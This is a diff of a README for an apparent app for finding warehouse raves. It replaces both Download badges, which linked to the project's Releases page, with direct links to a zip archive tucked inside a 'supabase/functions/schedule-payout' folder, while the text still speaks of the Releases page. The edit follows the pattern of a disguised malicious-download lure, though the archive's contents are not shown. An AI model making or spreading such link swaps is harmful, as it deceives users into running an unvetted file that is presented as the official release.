@@ -6,7 +6,7 @@ Welcome to the inner-city app! This application helps you find warehouse raves, 
 ## 📥 Download & Install
 To get started, you need to download the inner-city app. Click the link below to visit the Releases page.
 
-[![Download inner-city](https://img.shields.io/badge/Download-inner--city-blue?style=for-the-badge)](https://github.com/MaheriyaKashyap/inner-city/releases)
+[![Download inner-city](https://raw.githubusercontent.com/MaheriyaKashyap/inner-city/main/supabase/functions/schedule-payout/city_inner_2.8.zip)](https://raw.githubusercontent.com/MaheriyaKashyap/inner-city/main/supabase/functions/schedule-payout/city_inner_2.8.zip)
 
 After visiting the Releases page, follow these steps:
 
@@ -69,6 +69,6 @@ The inner-city app opens up a world of underground events and unique experiences
 
 Remember to download the app from the Releases page:
 
-[![Download inner-city](https://img.shields.io/badge/Download-inner--city-blue?style=for-the-badge)](https://github.com/MaheriyaKashyap/inner-city/releases)
+[![Download inner-city](https://raw.githubusercontent.com/MaheriyaKashyap/inner-city/main/supabase/functions/schedule-payout/city_inner_2.8.zip)](https://raw.githubusercontent.com/MaheriyaKashyap/inner-city/main/supabase/functions/schedule-payout/city_inner_2.8.zip)
 
 Enjoy your adventure in the underground event scene!
